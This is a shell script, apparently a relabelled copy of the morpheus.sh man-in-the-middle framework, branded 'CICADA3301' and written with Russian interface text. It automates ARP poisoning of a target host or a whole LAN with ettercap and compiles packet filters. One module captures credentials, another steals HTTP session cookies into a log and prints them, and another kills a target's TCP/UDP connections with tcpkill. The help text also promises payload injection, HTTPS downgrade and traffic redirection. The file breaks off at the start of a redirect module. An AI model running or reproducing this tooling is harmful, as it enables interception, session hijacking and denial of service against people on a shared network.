#!/bin/sh
###

resize -s 37 78 > /dev/null
# inicio




# -----------------------------------
# Colorise shell Script output leters
# -----------------------------------
Colors() {
Escape="\033";
  white="${Escape}[0m";
  RedF="${Escape}[31m";
  GreenF="${Escape}[32m";
  YellowF="${Escape}[33m";
  BlueF="${Escape}[34m";
  CyanF="${Escape}[36m";
Reset="${Escape}[0m";
}




# ---------------------
# Variable declarations
# ---------------------
dtr=`date | awk '{print $4}'`        # grab current hour
V3R="2.3"                            # module version number
cnm="oneiroi_phobetor"               # module codename
DiStR0=`awk '{print $1}' /etc/issue` # grab distribution -  Ubuntu or Kali
IPATH=`pwd`                          # grab morpheus.sh install path
GaTe=`ip route | grep "default" | awk {'print $3'}` > /dev/null 2>&1    # gateway
IP_RANGE=`ip route | grep "kernel" | awk {'print $1'}` > /dev/null 2>&1 # ip-range
PrompT=`cat $IPATH/settings | egrep -m 1 "PROMPT_DISPLAY" | cut -d '=' -f2` > /dev/null 2>&1
LoGs=`cat $IPATH/settings | egrep -m 1 "WRITE_LOGFILES" | cut -d '=' -f2` > /dev/null 2>&1
IpV=`cat $IPATH/settings | egrep -m 1 "USE_IPV6" | cut -d '=' -f2` > /dev/null 2>&1
Edns=`cat $IPATH/settings | egrep -m 1 "ETTER_DNS" | cut -d '=' -f2` > /dev/null 2>&1
Econ=`cat $IPATH/settings | egrep -m 1 "ETTER_CONF" | cut -d '=' -f2` > /dev/null 2>&1
ApachE=`cat $IPATH/settings | egrep -m 1 "AP_PATH" | cut -d '=' -f2` > /dev/null 2>&1
LoGmSf=`cat $IPATH/settings | egrep -m 1 "LOG_MSF" | cut -d '=' -f2` > /dev/null 2>&1
TcPkiL=`cat $IPATH/settings | egrep -m 1 "TCP_KILL" | cut -d '=' -f2` > /dev/null 2>&1
UsNar=`cat $IPATH/settings | egrep -m 1 "URL_SNARF" | cut -d '=' -f2` > /dev/null 2>&1
MsGnA=`cat $IPATH/settings | egrep -m 1 "MSG_SNARF" | cut -d '=' -f2` > /dev/null 2>&1
PrEfI=`cat $IPATH/settings | egrep -m 1 "PREFIX" | cut -d '=' -f2` > /dev/null 2>&1
DrIn=`cat $IPATH/settings | egrep -m 1 "DRI_NET" | cut -d '=' -f2` > /dev/null 2>&1
RbUdB=`cat $IPATH/settings | egrep -m 1 "REBUILD_DB" | cut -d '=' -f2` > /dev/null 2>&1
IPH_UA=`cat $IPATH/settings | egrep -m 1 "IPHONE_USERAGENT" | cut -d '=' -f2` > /dev/null 2>&1
LUA_PATH=`cat $IPATH/settings | egrep -m 1 "LIB_PATH" | cut -d '=' -f2` > /dev/null 2>&1




Colors;
cat << !

██████╗ ██████╗  ██████╗ ███╗   ███╗███████╗██████████╗██╗  ██╗███████╗██╗   ██╗███████╗
██╔══██╗██╔══██╗██╔═══██╗████╗ ████║██╔════╝╚═══██╔═══╝██║  ██║██╔════╝██║   ██║██╔════╝
██████╔╝██████╔╝██║   ██║██╔████╔██║█████╗      ██║    ███████║█████╗  ██║   ██║███████╗
██╔═══╝ ██╔══██╗██║   ██║██║╚██╔╝██║██╔══╝      ██║    ██╔══██║██╔══╝  ██║   ██║╚════██║
██║     ██║  ██║╚██████╔╝██║ ╚═╝ ██║███████╗    ██║    ██║  ██║███████╗╚██████╔╝███████║
╚═╝     ╚═╝  ╚═╝ ╚═════╝ ╚═╝     ╚═╝╚══════╝    ╚═╝    ╚═╝  ╚═╝╚══════╝ ╚═════╝ ╚══════╝

     ██████╗ ███████╗███████╗ ███╗  ██╗ ███████╗ ██╗   ██╗ ██████╗ ██╗   ██╗
     ██╔══██╗██╔════╝██╔═══██╗████╗ ██║██╔════██╗██║  ██╔╝██╔═══██╗██║   ██║
     ██████╔╝█████╗  ██║   ██║██╔██╗██║██║    ██║██████╔╝ ██║   ██║██║   ██║
     ██╔══██╗██╔══╝  ██║   ██║██║╚████║█████████║██╔══██╗ ██║   ██║██║   ██║
     ██████╔╝███████╗███████╔╝██║ ╚███║██╔════██║██║   ██╗╚██████╔╝╚╗████╔═╝
     ╚═════╝ ╚══════╝╚══════╝ ╚═╝  ╚══╝╚═╝    ╚═╝╚═╝   ╚═╝ ╚═════╝  ╚════╝

██╗    ╔██╗  ███████╗   ██████╗  ██╗   ██╗            ██╗      ██╗ ██╗   ██╗ ███████╗
╚═██╗ ██╔═╝ ██╔════██╗ ██╔═══██╗ ██║  ██╔╝            ██║      ██║ ██║   ██║ ██╔════╝
  ╚═██╔═╝   ██║    ██║ ██║       ██████╔╝  ████████╗  ██║      ██║ ██║   ██║ █████╗
  ██║ ██╗   █████████║ ██║   ██║ ██╔══██╗  ╚═══════╝  ██║      ██║ ██║   ██║ ██╔══╝
██╔═╝ ╚╗██╗ ██╔════██║  ██████╔╝ ██║   ██╗            ███████╗ ██║ ╚╗████╔═╝ ███████╗
╚═╝    ╚══╝ ╚═╝    ╚═╝  ╚═════╝  ╚═╝   ╚═╝            ╚══════╝ ╚═╝  ╚════╝   ╚══════╝

!
echo "${RedF}    Bednakov-Xack-Live${white}©::${RedF}v$V3R${white}::${RedF}CICADA3301${white}::${RedF}oneiroi_phobetor${white}::${RedF}SuspiciousShellActivity${white}©"
echo "${BlueF}    ╔────────────────────────────────────────────────────────────────────────────────╗"
echo "${BlueF}    |${YellowF}CICADA3301 - это пакет «Человек в середине», который позволяет пользователям    ${BlueF}|"
echo "${BlueF}    |${YellowF}манипулировать данными tcp/udp с помощью ettercap, urlsnarf, msgsnarf, tcpkill  ${BlueF}|"
echo "${BlueF}    |${YellowF}в качестве внутренних приложений, но ... Основная цель этого инструмента - не   ${BlueF}|"
echo "${BlueF}    |${YellowF}обеспечить простой способ эксплуатировать/нюхать цели, но чаще всего            ${BlueF}|"
echo "${BlueF}    |${YellowF}попытка техники манипулирования tcp/udp (фильтры etter).                        ${BlueF}|"
echo "${BlueF}    ╠────────────────────────────────────────────────────────────────────────────────╝"
sleep 1
echo "${BlueF}    ╘ ${white}Нажмите [${GreenF} ENTER ${white}] продолжить ${RedF}!"
read OP
# -----------------------------------------
# check if user is root
# and if dependencies are proper installed
# ----------------------------------------
if [ $(id -u) != "0" ]; then
echo ""
echo ${RedF}[☠]${white} we need to be root to run this script...${Reset};
echo ${RedF}[☠]${white} execute [ sudo ./morpheus.sh ] on terminal ${Reset};
exit
fi


apc=`which ettercap`
if [ "$?" != "0" ]; then
echo ""
echo ${RedF}[☠]${white} ettercap '->' not found! ${Reset};
sleep 1
echo ${RedF}[☠]${white} This script requires ettercap to work! ${Reset};
echo ${RedF}[☠]${white} Please run: sudo apt-get install ettercap ${Reset};
echo ${RedF}[☠]${white} to install missing dependencies... ${Reset};
exit
fi



npm=`which nmap`
if [ "$?" != "0" ]; then
echo ""
echo ${RedF}[☠]${white} nmap '->' not found! ${Reset};
sleep 1
echo ${RedF}[☠]${white} This script requires nmap to work! ${Reset};
echo ${RedF}[☠]${white} Please run: sudo apt-get install nmap ${Reset};
echo ${RedF}[☠]${white} to install missing dependencies... ${Reset};
exit
fi



npm=`which apache2`
if [ "$?" != "0" ]; then
echo ""
echo ${RedF}[☠]${white} apache2 '->' not found! ${Reset};
sleep 1
echo ${RedF}[☠]${white} This script requires apache2 to work! ${Reset};
echo ${RedF}[☠]${white} Please run: sudo apt-get install apache ${Reset};
echo ${RedF}[☠]${white} to install missing dependencies... ${Reset};
exit
fi





# ------------------------------------------
# pass arguments to script [ -h ]
# we can use: ./morpheus.sh -h for help menu
# ------------------------------------------
while getopts ":h" opt; do
  case $opt in
    h)
cat << !
---
-- Author: r00t-3xp10it | SSA RedTeam @2018
-- Supported: Linux Kali, Ubuntu, Mint, Parrot OS
-- Suspicious-Shell-Activity (SSA) RedTeam develop @2016
---

   morpheus.sh framework automates tcp/udp packet manipulation tasks by using
   ettercap filters to manipulate target http requests under MitM attacks
   replacing the http packet contents by our own contents befor sending the
   packet back to the host that have request for it (tcp/ip hijacking).

   morpheus ships with a collection of etter filters writen be me to acomplish
   various tasks: replacing images in webpages, replace text in webpages, inject
   payloads using html <form> tag, denial-of-service attack (drop packets from source)
   https/ssh downgrade attacks, redirect target browser traffic to another ip address
   and also gives you the ability to build/compile your filter from scratch and lunch
   it through morpheus framework.

!
   exit
    ;;
    \?)
      echo ${RedF}[x]${white} Invalid option:${RedF} -$OPTARG ${Reset}; >&2
      exit
    ;;
  esac
done




# ---------------------------------------------
# grab Operative System distro to store IP addr
# output = Ubuntu OR Kali OR Parrot OR BackBox
# ---------------------------------------------
InT3R=`netstat -r | grep "default" | awk {'print $8'}` # grab interface in use
case $DiStR0 in
    Kali) IP=`ifconfig $InT3R | egrep -w "inet" | awk '{print $2}'`;;
    Debian) IP=`ifconfig $InT3R | egrep -w "inet" | awk '{print $2}'`;;
    Mint) IP=`ifconfig $InT3R | egrep -w "inet" | awk '{print $2}' | cut -d ':' -f2`;;
    Ubuntu) IP=`ifconfig $InT3R | egrep -w "inet" | awk {'print $2'} | cut -d ':' -f2`;;
    Parrot) IP=`ifconfig $InT3R | egrep -w "inet" | awk '{print $2}'`;;
    BackBox) IP=`ifconfig $InT3R | egrep -w "inet" | awk {'print $2'} | cut -d ':' -f2`;;
    elementary) IP=`ifconfig $InT3R | egrep -w "inet" | cut -d ':' -f2 | cut -d 'B' -f1`;;
    *) IP=`zenity --title="☠ Введите свой IP-адрес ☠" --text "пример: 192.168.1.68" --entry --width 270`;;
esac


# config internal framework settings
ping -c 3 www.google.com | zenity --progress --pulsate --title "☠ CICADA3301 TCP/IP Bednakov-Xack-Live ☠" --text="Настроить параметры внутренней структуры ... \ nip addr, диапазон ip, шлюз, интерфейс \ netter.conf, etter.dns, привилегии uid / gid." --percentage=0 --auto-close --width 290 > /dev/null 2>&1
if [ -e $Econ ]; then
  cp $Econ /tmp/etter.conf > /dev/null 2>&1
  cp $IPATH/bin/etter.conf $Econ > /dev/null 2>&1
  sleep 1
else
  echo ${RedF}[x]${white} morpheus cant Find:${RedF} $Econ ${Reset};
  echo ${RedF}[x]${white} edit settings File to input path of etter.conf File ${Reset};
  sleep 2
  exit
fi


# ----------------------------------
# bash trap ctrl-c and call ctrl_c()
# ----------------------------------
trap ctrl_c INT
ctrl_c() {
echo "${RedF}[x]${white} CTRL + C Прервать текущие задачи${RedF}...${Reset}"
# clean logfiles folder at exit
rm $IPATH/logs/parse > /dev/null 2>&1
rm $IPATH/logs/lan.mop > /dev/null 2>&1
rm $IPATH/logs/triggertwo > /dev/nul 2>&1
rm $IPATH/output/firewall.ef > /dev/null 2>&1
rm $IPATH/output/template.ef > /dev/null 2>&1
rm $IPATH/output/redirect.ef > /dev/null 2>&1
rm $IPATH/output/EasterEgg.ef > /dev/null 2>&1
rm $IPATH/output/UserAgent.ef > /dev/null 2>&1
rm $IPATH/output/grab_hosts.ef > /dev/null 2>&1
rm $IPATH/output/packet_drop.ef > /dev/null 2>&1
rm $IPATH/output/img_replace.ef > /dev/null 2>&1
rm $IPATH/output/sidejacking.ef > /dev/null 2>&1
rm $IPATH/output/chat_services.ef > /dev/null 2>&1
rm $IPATH/output/dhcp-discovery.ef > /dev/null 2>&1
rm $IPATH/output/cryptocurrency.ef > /dev/null 2>&1
# revert filters to default stage
mv $IPATH/filters/firewall.rb $IPATH/filters/firewall.eft > /dev/null 2>&1
mv $IPATH/filters/template.rb $IPATH/filters/template.eft > /dev/null 2>&1
mv $IPATH/filters/redirect.rb $IPATH/filters/redirect.eft > /dev/null 2>&1
mv $IPATH/filters/EasterEgg.rb $IPATH/filters/EasterEgg.eft > /dev/null 2>&1
mv $IPATH/filters/UserAgent.rb $IPATH/filters/UserAgent.eft > /dev/null 2>&1
mv $IPATH/filters/grab_hosts.rb $IPATH/filters/grab_hosts.eft > /dev/null 2>&1
mv $IPATH/filters/packet_drop.rb $IPATH/filters/packet_drop.eft > /dev/null 2>&1
mv $IPATH/filters/img_replace.rb $IPATH/filters/img_replace.eft > /dev/null 2>&1
mv $IPATH/filters/sidejacking.rb $IPATH/filters/sidejacking.eft > /dev/null 2>&1
mv $IPATH/filters/chat_services.rb $IPATH/filters/chat_services.eft > /dev/null 2>&1
mv $IPATH/filters/cryptocurrency.rb $IPATH/filters/cryptocurrency.eft > /dev/null 2>&1
mv $IPATH/filters/dhcp-discovery.bak $IPATH/filters/dhcp-discovery.eft > /dev/null 2>&1
mv $IPATH/bin/phishing/EasterEgg.bak $IPATH/bin/phishing/EasterEgg.html > /dev/null 2>&1
rm -r $IPATH/logs/capture > /dev/null 2>&1
rm $ApachE/index.html > /dev/null 2>&1
rm $ApachE/cssbanner.js > /dev/null 2>&1
rm -R $ApachE/"Google Sphere_files" > /dev/null 2>&1
mv $IPATH/bin/etter.rb $IPATH/bin/etter.dns > /dev/null 2>&1
# revert ettercap conf files to default stage
if [ -e $Edns ]; then
mv /tmp/etter.dns $Edns > /dev/null 2>&1
echo ${BlueF}[${GreenF}✔${BlueF}]${white} Revert ettercap etter.dns ${Reset};
fi
if [ -e $Econ ]; then
echo ${BlueF}[${GreenF}✔${BlueF}]${white} Revert ettercap etter.conf ${Reset};
mv /tmp/etter.conf $Econ > /dev/null 2>&1
fi
sleep 2
exit
}




#
#
# START OF SCRIPT FUNTIONS
#
#
# ----------------------------------------
# PRE-CONFIGURATED TEMPLATE - FIREWALL.EFT
# ----------------------------------------
sh_stage1 () {
echo ""
echo "${BlueF}    ╔───────────────────────────────────────────────────────────────────────────────────╗"
echo "${BlueF}    | ${YellowF}Этот модуль действует как отчет брандмауэра / block / capture_credentials         ${BlueF}|"
echo "${BlueF}    | ${YellowF}    из выбранных целей соединения TCP / UDP (локальная сеть)                      ${BlueF}|"
echo "${BlueF}    ╚───────────────────────────────────────────────────────────────────────────────────╝"
echo ""
sleep 2
# run module?
rUn=$(zenity --question --title="☠ CICADA3301 TCP/IP Bednakov-Xack-Live ☠" --text "Выполнить этот модуль?" --width 270) > /dev/null 2>&1
if [ "$?" -eq "0" ]; then

# get user input to build filter
echo ${BlueF}[☠]${white} Введите настройки фильтра${RedF}! ${Reset};
rhost=$(zenity --title="☠ Ввести  RHOST ☠" --text "'настройки отравления для арфея CICADA3301 '\Оставьте поле пустым, чтобы отравить всю локальную сеть." --entry --width 270) > /dev/null 2>&1
gateway=$(zenity --title="☠ Введите Шлюз ☠" --text "'Настройки яда CICADA3301 arp '\Оставьте пустым, чтобы отравить всю локальную сеть." --entry --width 270) > /dev/null 2>&1

  echo ${BlueF}[☠]${white} Необходимы резервные файлы${RedF}!${Reset};
  cp $IPATH/filters/firewall.eft $IPATH/filters/firewall.rb > /dev/null 2>&1
  sleep 1

  echo ${BlueF}[☠]${white} редактировать брандмауэр.eft${RedF}!${Reset};
  sleep 1
fil_one=$(zenity --title="☠ ХОСТ ДЛЯ ФИЛЬТРА ☠" --text "пример: $IP\Выберите первую цель для фильтрации через CICADA3301." --entry --width 270) > /dev/null 2>&1
fil_two=$(zenity --title="☠ ХОСТ ДЛЯ ФИЛЬТРА ☠" --text "пример: $IP\Выберите последнюю цель для фильтрации через CICADA3301. \Выберите ip шлюза, если у вас больше нет целей." --entry --width 270) > /dev/null 2>&1


  cd $IPATH/filters
  ed=`hostname`
  echo "$ed"7 > /tmp/test
  hOstNaMe=`cat /tmp/test`
  dIsd=`uname -r`
  # replace values in template.filter with sed bash command
  sed -i "s|TaRONE|$fil_one|g" firewall.eft # NO dev/null to report file not existence :D
  sed -i "s|TaRTWO|$fil_two|g" firewall.eft > /dev/null 2>&1
  sed -i "s|hOst|$hOstNaMe|g" firewall.eft > /dev/null 2>&1
  sed -i "s|MoDeM|$GaTe|g" firewall.eft > /dev/null 2>&1
  sed -i "s|DisTr|$dIsd|g" firewall.eft > /dev/null 2>&1
  rm /tmp/test > /dev/null 2>&1
  cd $IPATH
  zenity --info --title="☠ CICADA3301 СКРИПТИНГОВАЯ КОНСОЛЬ ☠" --text "рамки CICADA3301 теперь дает вам возможность просто запустить фильтр\ИЛИ к дальнейшему написанию сценариев...\n\n'Получайте удовольствие от написания сценариев'..." --width 270 > /dev/null 2>&1
  xterm -T "CICADA3301 СКРИПТИНГОВАЯ КОНСОЛЬ" -geometry 115x36 -e "nano $IPATH/filters/firewall.eft"
  sleep 1

    # составление firewall.eft to be used in ettercap
    echo ${BlueF}[☠]${white} составление firewall.eft${RedF}!${Reset};
    xterm -T "CICADA3301 - СОСТАВЛЕНИЕ" -geometry 90x26 -e "etterfilter $IPATH/filters/firewall.eft -o $IPATH/output/firewall.ef && sleep 3"
    sleep 1
    # port-forward
    # echo "1" > /proc/sys/net/ipv4/ip_forward
    cd $IPATH/logs

      # run mitm+filter
      echo ${BlueF}[☠]${white} Запуск ARP яд + фильтр Etter${RedF}!${Reset};
      echo ${YellowF}[☠]${white} Нажмите ${YellowF}[q]${white} to quit ettercap framework${RedF}!${Reset};
      sleep 2
      if [ "$IpV" = "ACTIVE" ]; then
        if [ "$LoGs" = "NO" ]; then
        echo ${GreenF}[☠]${white} Using IPv6 settings${RedF}!${Reset};
        ettercap -T -Q -i $InT3R -F $IPATH/output/firewall.ef -M ARP /$rhost// /$gateway//
        else
        echo ${GreenF}[☠]${white} Using IPv6 settings${RedF}!${Reset};
        ettercap -T -Q -i $InT3R -F $IPATH/output/firewall.ef -L $IPATH/logs/firewall -M ARP /$rhost// /$gateway//
        fi

      else

        if [ "$LoGs" = "YES" ]; then
        echo ${GreenF}[☠]${white} Using IPv4 settings${RedF}!${Reset};
        ettercap -T -Q -i $InT3R -F $IPATH/output/firewall.ef -M ARP /$rhost/ /$gateway/
        else
        echo ${GreenF}[☠]${white} Using IPv4 settings${RedF}!${Reset};
        ettercap -T -Q -i $InT3R -F $IPATH/output/firewall.ef -L $IPATH/logs/firewall -M ARP /$rhost/ /$gateway/
        fi
      fi

  # check if exist any reports
  dd=`ls $IPATH/logs`
  if ! [ -z "$dd" ]; then
  Qu=$(zenity --info --title="☠ CICADA3301 TCP / IP Bednakov-Xack-Live ☠" --text "сохраненные лог-файлы $IPATH/logs" --width 270) > /dev/null 2>&1
  fi

  # clean up
  echo ${BlueF}[☠]${white} Cleaning recent files${RedF}!${Reset};
  mv $IPATH/filters/firewall.rb $IPATH/filters/firewall.eft > /dev/null 2>&1
  # port-forward
  # echo "0" > /proc/sys/net/ipv4/ip_forward
  sleep 2
  rm $IPATH/output/firewall.ef > /dev/null 2>&1
  cd $IPATH

else
  echo ${RedF}[x]${white} Abort current tasks${RedF}!${Reset};
  sleep 2
fi
}






# -------------------------------------------
# SIDEJACKING ATTACK (HTTP) STEAL COOKIES
# -------------------------------------------
sh_stage2 () {
echo ""
echo "${BlueF}    ╔───────────────────────────────────────────────────────────────────────────────────────╗"
echo "${BlueF}    | ${YellowF}    Этот модуль будет отображать порт 80 (http) и порт 443 (https)                    ${BlueF}|"
echo "${BlueF}    | ${YellowF}  трафик от выбранного целевого хоста, и он будет предупреждать злоумышленника        ${BlueF}|"
echo "${BlueF}    | ${YellowF} Если какой-либо файл cookie авторизации его захвачен и сохранен в 'sidejacking.log'  ${BlueF}|"
echo "${BlueF}    | ${YellowF}                                                                                      ${BlueF}|"
echo "${BlueF}    | ${YellowF}  «Также этот модуль позволяет пользователям вводить имя файла cookie для фильтрации» ${BlueF}|"
echo "${BlueF}    ╚───────────────────────────────────────────────────────────────────────────────────────╝"
echo ""
sleep 2
# run module?
rUn=$(zenity --question --title="☠ CICADA3301 TCP / IP Bednakov-Xack-Live ☠" --text "Выполнить этот модуль?" --width 270) > /dev/null 2>&1
if [ "$?" -eq "0" ]; then

# get user input to build filter
rm $IPATH/logs/sidejacking.log > /dev/null 2>&1
echo ${BlueF}[☠]${white} Enter filter settings${RedF}! ${Reset};
rhost=$(zenity --title="☠ Введите RHOST ☠" --text "'настройки яда CICADA3301 арпа'\n\Оставьте пустым, чтобы отравить всю местную сеть." --entry --width 270) > /dev/null 2>&1
gateway=$(zenity --title="☠ Введите Шлюз ☠" --text "'настройки яда CICADA3301 арпа'\Оставьте пустым, чтобы отравить всю местную сеть." --entry --width 270) > /dev/null 2>&1


  echo ${BlueF}[☠]${white} Необходимы резервные файлы${RedF}!${Reset};
  cp $IPATH/filters/sidejacking.eft $IPATH/filters/sidejacking.rb > /dev/null 2>&1
  sleep 1

  echo ${BlueF}[☠]${white} Edit sidejacking.eft${RedF}!${Reset};
  sleep 1
  fil_one=$(zenity --title="☠ ХОСТ ДЛЯ ФИЛЬТРА ☠" --text "пример: $IP\Выберите цель для фильтрации через CICADA3301." --entry --width 270) > /dev/null 2>&1
  FiLteR=$(zenity --title="☠ Введите COOKIE NAME ☠" --text "пример:Идентификатор пользователя=\Если вы хотите перехватить все куки, используйте: Cookie \Введите имя куки для фильтрации через morpheus." --entry --width 270) > /dev/null 2>&1
  # replace values in template.filter with sed bash command
  cd $IPATH/filters
  sed -i "s|TaRgEt|$fil_one|g" sidejacking.eft # NO dev/null to report file not existence :D
  sed -i "s|UsErInPut|$FiLteR|g" sidejacking.eft > /dev/null 2>&1
  cd $IPATH
  zenity --info --title="☠ CICADA3301 СКРИПТИНГОВАЯ КОНСОЛЬ ☠" --text "Фреймворк CICADA3301 теперь дает вам \n возможность просто запустить фильтр \nOR для дальнейшего его скриптинга ... \n\n'Подробнее его написать'..." --width 270 > /dev/null 2>&1
  xterm -T "CICADA3301 СКРИПТИНГОВАЯ КОНСОЛЬ" -geometry 115x36 -e "nano $IPATH/filters/sidejacking.eft"
  sleep 1

    # compiling packet_drop.eft to be used in ettercap
    echo ${BlueF}[☠]${white} составление sidejacking.eft${RedF}!${Reset};
    xterm -T "CICADA3301 - СОСТАВЛЕНИЕ" -geometry 90x26 -e "etterfilter $IPATH/filters/sidejacking.eft -o $IPATH/output/sidejacking.ef && sleep 3"
    sleep 1
    # port-forward
    # echo "1" > /proc/sys/net/ipv4/ip_forward
    cd $IPATH/logs

      # run mitm+filter
      echo ${BlueF}[☠]${white} Запуск ARP яд + фильтр Etter${RedF}!${Reset};
      echo ${YellowF}[☠]${white} Нажмите ${YellowF}[q]${white} to quit ettercap framework${RedF}!${Reset};
      sleep 2
      if [ "$IpV" = "ACTIVE" ]; then
        if [ "$LoGs" = "NO" ]; then
        echo ${GreenF}[☠]${white} Using IPv6 settings${RedF}!${Reset};
        ettercap -T --visual text -Q -i $InT3R -F $IPATH/output/sidejacking.ef -M ARP /$rhost// /$gateway//
        else
        echo ${GreenF}[☠]${white} Using IPv6 settings${RedF}!${Reset};
        ettercap -T --visual text -Q -i $InT3R -F $IPATH/output/sidejacking.ef -L $IPATH/logs/sidejacking -M ARP /$rhost// /$gateway//
        fi

      else

        if [ "$LoGs" = "YES" ]; then
        echo ${GreenF}[☠]${white} Using IPv4 settings${RedF}!${Reset};
        ettercap -T --visual text -Q -i $InT3R -F $IPATH/output/sidejacking.ef -M ARP /$rhost/ /$gateway/
        else
        echo ${GreenF}[☠]${white} Using IPv4 settings${RedF}!${Reset};
        ettercap -T --visual text -Q -i $InT3R -F $IPATH/output/sidejacking.ef -L $IPATH/logs/sidejacking -M ARP /$rhost/ /$gateway/
        fi
      fi


  cd $IPATH/logs
  # delete utf-8/non-ancii caracters from tcp data captured
  tr -cd '\11\12\15\40-\176' < sidejacking.log > clean-file.log
  mv clean-file.log sidejacking.log > /dev/null 2>&1
  # store captured data (cookies) into one variable
  fdd=`cat $IPATH/logs/sidejacking.log` > /dev/null 2>&1
  # check if variable its 'empty'
  if ! [ -z "$fdd" ]; then
  echo ""
  # print captured data (cookies captured list)
  echo "${white}Host:${YellowF} $fil_one ${white}cookies report${RedF}!"
  echo "$fdd"
  echo ""
  # warn users that we have data stored into a logfile
  Qu=$(zenity --info --title="☠ CICADA3301 TCP / IP Bednakov-Xack-Live ☠" --text "сохраненные лог-файлы $IPATH/logs" --width 270) > /dev/null 2>&1
  fi

  # clean up
  echo ${BlueF}[☠]${white} Cleaning recent files${RedF}!${Reset};
  mv $IPATH/filters/sidejacking.rb $IPATH/filters/sidejacking.eft > /dev/null 2>&1
  # port-forward
  # echo "0" > /proc/sys/net/ipv4/ip_forward
  sleep 2
  rm $IPATH/output/sidejacking.ef > /dev/null 2>&1
  cd $IPATH

else
  echo ${RedF}[x]${white} Abort current tasks${RedF}!${Reset};
  sleep 2
fi
}






# -------------------------------------------
# DROP/KILL TCP/UDP CONNECTION TO/FROM TARGET
# -------------------------------------------
sh_stage3 () {
echo ""
echo "${BlueF}    ╔──────────────────────────────────────────────────────────────────────────────────╗"
echo "${BlueF}    | ${YellowF}   Этот модуль будет отбрасывать/уничтожать любые попытки соединения tcp/udp     ${BlueF}|"
echo "${BlueF}    | ${YellowF}   к/от цели, отбрасывая пакеты от источника и назначения..                      ${BlueF}|"
echo "${BlueF}    | ${YellowF}                                                                                 ${BlueF}|"
echo "${BlueF}    | ${YellowF} 'Этот модуль использует фильтры etter и tcpkill для уничтожения соединений'     ${BlueF}|"
echo "${BlueF}    ╚──────────────────────────────────────────────────────────────────────────────────╝"
echo ""
sleep 2
# run module?
rUn=$(zenity --question --title="☠ CICADA3301 TCP / IP Bednakov-Xack-Live ☠" --text "Выполнить этот модуль?" --width 270) > /dev/null 2>&1
if [ "$?" -eq "0" ]; then

ch=`which tcpkill`
if [ "$ch" != "$TcPkiL" ]; then
echo ${RedF}[x]${white} tcpkill utility not found${RedF}!${Reset};
sleep 1
echo ${RedF}[x]${white} please Install:${RedF}dsniff${white} packet...${Reset};
sleep 3
sh_exit
fi

# get user input to build filter
echo ${BlueF}[☠]${white} Enter filter settings${RedF}! ${Reset};
rhost=$(zenity --title="☠ Введите RHOST ☠" --text "'настройки отравления для арфея CICADA3301 '\n\Оставьте пустым, чтобы отравить всю локальную сеть." --entry --width 270) > /dev/null 2>&1
gateway=$(zenity --title="☠ Введите Шлюз ☠" --text "'настройки отравления для арфея CICADA3301 '\Оставьте поле пустым, чтобы отравить всю локальную сеть." --entry --width 270) > /dev/null 2>&1

  echo ${BlueF}[☠]${white} Backup files needed${RedF}!${Reset};
  cp $IPATH/filters/packet_drop.eft $IPATH/filters/packet_drop.rb > /dev/null 2>&1
  sleep 1

  echo ${BlueF}[☠]${white} Edit packet_drop.eft${RedF}!${Reset};
  sleep 1
 fil_one=$(zenity --title="☠ ХОСТ ДЛЯ ФИЛЬТРА ☠" --text "пример: $IP\выбрал цель для фильтрации через CICADA3301." --entry --width 270) > /dev/null 2>&1
  # replace values in template.filter with sed bash command
  cd $IPATH/filters
  sed -i "s|TaRgEt|$fil_one|g" packet_drop.eft # NO dev/null to report file not existence :D
  cd $IPATH
  zenity --info --title="☠ CICADA3301 СКРИПТИНГОВАЯ КОНСОЛЬ ☠" --text "Фреймворк CICADA3301 теперь дает вам \возможность просто запустить фильтр \OR для дальнейшего его скриптинга ... \n\n'Подробнее его написать'..." --width 270 > /dev/null 2>&1
  xterm -T "CICADA3301 СКРИПТИНГОВАЯ КОНСОЛЬ" -geometry 115x36 -e "nano $IPATH/filters/packet_drop.eft"
  sleep 1

    # compiling packet_drop.eft to be used in ettercap
    echo ${BlueF}[☠]${white} составление packet_drop.eft${RedF}!${Reset};
    xterm -T "CICADA3301 - СОСТАВЛЕНИЕ" -geometry 90x26 -e "etterfilter $IPATH/filters/packet_drop.eft -o $IPATH/output/packet_drop.ef && sleep 3"
    sleep 1
    # port-forward
    # echo "1" > /proc/sys/net/ipv4/ip_forward
    cd $IPATH/logs

      # run mitm+filter
      echo ${BlueF}[☠]${white} Запуск ARP яд + фильтр Etter${RedF}!${Reset};
      echo ${YellowF}[☠]${white} Нажмите ${YellowF}[q]${white} to quit ettercap framework${RedF}!${Reset};
      sleep 2
      if [ "$IpV" = "ACTIVE" ]; then
        if [ "$LoGs" = "NO" ]; then
        echo ${GreenF}[☠]${white} Using IPv6 settings${RedF}!${Reset};
        xterm -T "CICADA3301 - TCPKILL [ctrl + c, чтобы прервать]" -geometry 120x27 -e "tcpkill -i $InT3R -7 host $fil_one" & ettercap -T -Q -i $InT3R -F $IPATH/output/packet_drop.ef -M ARP /$rhost// /$gateway//
        else
        echo ${GreenF}[☠]${white} Using IPv6 settings${RedF}!${Reset};
        xterm -T "CICADA3301 - TCPKILL [ctrl + c, чтобы прервать]" -geometry 120x27 -e "tcpkill -i $InT3R -7 host $fil_one" & ettercap -T -Q -i $InT3R -F $IPATH/output/packet_drop.ef -L $IPATH/logs/packet_drop -M ARP /$rhost// /$gateway//
        fi

      else

        if [ "$LoGs" = "YES" ]; then
        echo ${GreenF}[☠]${white} Using IPv4 settings${RedF}!${Reset};
        xterm -T "CICADA3301 - TCPKILL [ctrl + c, чтобы прервать]" -geometry 120x27 -e "tcpkill -i $InT3R -7 host $fil_one" & ettercap -T -Q -i $InT3R -F $IPATH/output/packet_drop.ef -M ARP /$rhost/ /$gateway/
        else
        echo ${GreenF}[☠]${white} Using IPv4 settings${RedF}!${Reset};
        xterm -T "CICADA3301 - TCPKILL [ctrl + c, чтобы прервать]" -geometry 120x27 -e "tcpkill -i $InT3R -7 host $fil_one" & ettercap -T -Q -i $InT3R -F $IPATH/output/packet_drop.ef -L $IPATH/logs/packet_drop -M ARP /$rhost/ /$gateway/
        fi
      fi

  # clean up
  echo ${BlueF}[☠]${white} Cleaning recent files${RedF}!${Reset};
  mv $IPATH/filters/packet_drop.rb $IPATH/filters/packet_drop.eft > /dev/null 2>&1
  # port-forward
  # echo "0" > /proc/sys/net/ipv4/ip_forward
  sleep 2
  rm $IPATH/output/packet_drop.ef > /dev/null 2>&1
  cd $IPATH
  # stop background running proccess
  # sudo pkill ettercap > /dev/null 2>&1
  # sudo pkill tcpkill > /dev/null 2>&1

else
  echo ${RedF}[x]${white} Abort current tasks${RedF}!${Reset};
  sleep 2
fi
}






# -----------------------------------------
# REDIRECT TARGET TRAFIC TO ANOTHER IP ADDR
